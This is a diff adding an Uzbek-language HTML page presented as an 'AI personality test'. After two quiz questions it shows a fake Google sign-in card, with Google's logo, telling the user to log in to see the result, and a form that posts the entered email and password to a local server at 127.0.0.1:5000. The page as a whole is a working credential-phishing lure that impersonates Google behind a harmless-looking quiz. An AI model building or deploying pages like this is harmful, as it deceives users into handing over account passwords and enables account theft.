@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="uz">
+  <head>
+    <meta charset="UTF-8" />
+    <title>AI Shaxsiyat Testi</title>
+    <style>
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .card {
+        background: white;
+        padding: 40px;
+        border-radius: 12px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        width: 350px;
+        text-align: center;
+      }
+      .hidden {
+        display: none;
+      }
+      h2 {
+        color: #1a73e8;
+        margin-bottom: 20px;
+      }
+      button {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 12px 25px;
+        border-radius: 6px;
+        cursor: pointer;
+        width: 100%;
+        font-size: 16px;
+        transition: 0.3s;
+      }
+      button:hover {
+        background: #1557b0;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border: 1px solid #dadce0;
+        border-radius: 6px;
+        box-sizing: border-box;
+      }
+      img {
+        width: 80px;
+        margin-bottom: 15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card" id="quiz-box">
+      <h2>AI Shaxsiyat Testi 🧠</h2>
+      <p id="q-text">
+        1. Siz ko'proq yolg'izlikni yoqtirasizmi yoki davralarni?
+      </p>
+      <button onclick="next()">Keyingi savol</button>
+    </div>
+
+    <div class="card hidden" id="login-box">
+      <img
+        src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+        alt="Google"
+      />
+      <h3>Tasdiqlash kerak</h3>
+      <p>
+        Natijani ko'rish uchun Google hisobingiz bilan kirib shaxsingizni
+        tasdiqlang.
+      </p>
+      <form action="http://127.0.0.1:5000/login" method="post">
+        <input
+          type="email"
+          name="email"
+          placeholder="Email yoki telefon"
+          required
+        />
+        <input
+          type="password"
+          name="password"
+          placeholder="Parolingizni kiriting"
+          required
+        />
+        <button type="submit">Natijani ko'rish</button>
+      </form>
+    </div>
+
+    <script>
+      let s = 1;
+      function next() {
+        if (s < 2) {
+          s++;
+          document.getElementById("q-text").innerText =
+            "2. Siz qaror qabul qilishda hissiyotga tayanasizmi?";
+        } else {
+          document.getElementById("quiz-box").classList.add("hidden");
+          document.getElementById("login-box").classList.remove("hidden");
+        }
+      }
+    </script>
+  </body>
+</html>
